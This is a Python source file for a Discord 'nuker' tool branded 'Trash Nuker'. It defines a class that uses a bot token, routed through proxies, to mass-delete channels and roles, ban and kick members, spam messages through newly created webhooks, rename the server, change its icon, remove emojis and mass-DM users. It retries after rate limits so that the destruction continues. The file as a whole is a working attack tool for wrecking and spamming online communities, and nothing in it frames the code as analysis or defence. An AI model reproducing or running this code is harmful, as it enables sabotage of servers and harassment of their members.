import requests as req, random, time, base64

from Plugins.tools import Tools


class Nuking:
    def __init__(self, token: str, guild_id: str) -> None:
        self.headers = {"Authorization": "Bot %s" % token,
                        "X-Audit-Log-Reason": "Trash Nuker"}
        self.guild, self.token = guild_id, token
    
    def delete_channel(self, channel_id: str):
        try:
            url = Tools.api("/channels/%s" % channel_id)
            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())

            if r.status_code == 200:
                return True
            else:
                if r.status_code == 429:
                    # print(r.json())
                    try:
                        time.sleep(r.json()["retry_after"])
                        return self.delete_channel(channel_id)

                    except Exception as err: 
                        print(err)
                        return False
                return False
        except: return False



    def create_channel(self, name: str, channel_type: int):
        try:
            url = Tools.api("/guilds/%s/channels" % self.guild)
            payload = {"name": name, "type": channel_type}
            r = req.post(url, headers=self.headers, json=payload, proxies=Tools.proxy())

            if r.status_code == 201:
                return r.json()["id"]
            else:
                return False
        except: return False


    def rename_channel(self, name: str, channel: str):
        try:
            url = Tools.api(f"/channels/{channel}")
            payload = {"name": name }

            r = req.patch(url, json=payload, headers=self.headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False




    def create_role(self, name: str):
        try:
            url = Tools.api("/guilds/%s/roles" % self.guild)
            payload = {"name": name, "hoist": True, "mentionable": True, "color": random.randint(0, 16777215)}
            r = req.post(url, headers=self.headers, json=payload, proxies=Tools.proxy())

            if r.status_code == 200:
                return r.json()["id"]
            else:
                return False
        except: return False




    def delete_role(self, role_id: str):
        try:
            url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
            
            r = req.delete(url, headers=self.headers, proxies= Tools.proxy())

            if r.status_code == 204:
                return True
            else: 
                if r.status_code == 429:
                    # print(r.json())
                    try:
                        time.sleep(r.json()["retry_after"])
                        return self.delete_role(role_id)

                    except Exception as err: 
                        print(err)
                        return False
                else:
                    return False
        except: return False            


    def rename_role(self, role_id: str, name: str):
        try:
            url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
            payload = {"name": name, "color": random.randint(0, 16777215)}

            r = req.patch(url, headers=self.headers, json=payload,  proxies= Tools.proxy())

            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                return True
            else: 
                if r.status_code == 429:
                    # print(r.json())
                    try:
                        time.sleep(r.json()["retry_after"])
                        return self.rename_role(role_id, name)

                    except Exception as err: 
                        print(err)
                        return False
                else:
                    return False
        except: return False


    def ban(self, member_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
            
            r = req.put(url, headers=self.headers, proxies=Tools.proxy())
            
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False


        
    def unban(self, member_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
            
            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())
            
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False
        

        
    def kick(self, member_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/members/{member_id}")
            
            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())


            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False



    def create_webhook(self, channel: str):
        try:
            url = Tools.api(f"/channels/{channel}/webhooks")
            payload = {"name": "Nuked by trash Nuker"}

            r = req.post(url, headers=self.headers, json=payload, proxies=Tools.proxy())

            if r.status_code == 200 and "url" in str(r.json()):
                return r.json()["url"]
            else:
                if r.status_code == 429:
                    print(r.json())
                    try:
                        time.sleep(r.json()["retry_after"])
                        return self.create_webhook(channel)

                    except Exception as err: 
                        print(err)
                        return False
                return False
        except: return False



    def send_webhook(self, url: str,message: str, times: int):
        try:
            payload = {
                "username": "ZZZZZZZZZZ",
                "content": message,
                "avatar_url": "https://cdn.discordapp.com/attachments/1054650838129332255/1189847060082606121/download.jpg?ex=659fa66d&is=658d316d&hm=411ec5aeef0752758152a1bb43df4a325f6bc625c3a532dc6db7201fbd3f09e0&"

            }

            for i in range(times):
                t = req.post(url, json=payload, proxies=Tools.proxy())
        except: pass

    def send_message(self, channel: str,message: str):
        try:
            url = Tools.api(f"channels/{channel}/messages")

            payload = {
                "content": message

            }

            r = req.post(url, json=payload, proxies=Tools.proxy(), headers=self.headers)

            if r.status_code == 200:
                return True
            else: 
                return False
        except: return False        
    
    def change_nick(self, member_id: str, nick: str):
        try:
            url = Tools.api(f"/guilds/{self.guild}/members/{member_id}")
            paylaod = {"nick": nick}

            r = req.patch(url, json=paylaod, headers=self.headers, proxies=Tools.proxy())

            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False        

    def rename_guild(self, name: str):
        try:
            url = Tools.api(f"/guilds/{self.guild}")
            payload = {"name": name}

            r = req.patch(url, headers=self.headers, json=payload, proxies=Tools.proxy())

            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False
        
    def change_guild_icon(self, icon_path: str):
        try:
            url = Tools.api(f"guilds/{self.guild}")
            icon_format = icon_path.split(".")
            icon_format = icon_format[len(icon_format)-1]
            with open(icon_path, "rb") as icon:
                payload = {"icon": f"data:image/{icon_format};base64,{base64.b64encode(icon.read()).decode(encoding='utf8')}"}

            r = req.patch(url, headers=self.headers, json=payload, proxies=Tools.proxy())

            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False

    def remove_emoji(self, emoji_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/emojis/{emoji_id}")

            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())


            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False

    def send_direct_message(self, user: str, message: str):
        try:
            url = Tools.api("/users/@me/channels")
            payload = {"recipient_id": user}

            r = req.post(url, json=payload, headers=self.headers, proxies=Tools.proxy())

            if r.status_code != 200: return False

            id = r.json()["id"]

            return self.send_message(id, message)
        except: return False

    
    def sussy_create_channel(self):
        url = Tools.api(f"/guilds/{self.guild}")

        payload = {
            "public_updates_channel_id": "1",
            "rules_channel_id": "1"
        }

        r = req.patch(url, json=payload, headers=self.headers)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            return True
        else:
            return False

